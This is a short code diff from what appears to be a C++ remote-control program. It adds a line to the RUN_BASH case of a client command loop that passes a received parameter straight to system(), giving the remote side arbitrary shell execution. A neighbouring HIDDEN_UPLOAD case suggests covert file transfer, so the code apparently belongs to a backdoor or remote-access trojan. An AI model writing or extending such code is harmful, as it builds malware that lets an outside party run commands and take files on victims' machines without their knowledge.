@@ -51,7 +51,7 @@ void loopIter(Client& client, SoftwareManeger& swm)
         break;
 
     case RUN_BASH:
-        /* code */
+        system(param.c_str());
         break;
 
     case HIDDEN_UPLOAD:
